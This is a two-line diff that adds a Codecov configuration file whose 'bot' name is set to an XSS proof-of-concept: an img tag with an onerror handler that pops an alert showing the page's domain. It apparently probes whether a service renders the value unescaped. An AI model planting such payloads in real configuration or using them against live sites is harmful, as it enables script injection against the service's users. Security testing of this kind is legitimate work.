@@ -1,0 +1,2 @@
+codecov:
+  bot: '<img onerror="alert(`xss on ${document.domain}`);" src="x" '
